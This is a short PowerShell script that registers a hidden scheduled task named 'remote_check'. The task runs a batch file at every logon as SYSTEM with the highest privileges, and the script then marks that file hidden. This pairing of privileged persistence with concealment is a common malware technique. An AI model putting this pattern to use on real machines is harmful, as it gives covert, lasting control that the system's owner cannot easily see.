
function Install-ScriptTask {
param (
  [string]$taskname
 )
    $scriptpath = 'e:\Tmp\check.bat' 
	$action = New-ScheduledTaskAction -Execute $scriptpath 
	$trigger = New-ScheduledTaskTrigger -AtLogOn
	$principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
	$settings = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -Hidden -Priority 1
	$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings


	Register-ScheduledTask $taskname -InputObject $task
	Start-ScheduledTask -TaskName $taskname

	LogStr "Hiding files..."
	LogStr "Invoke-Command { attrib +h $scriptpath }"
	Invoke-Command { attrib +h $scriptpath }
}


Install-ScriptTask 'remote_check'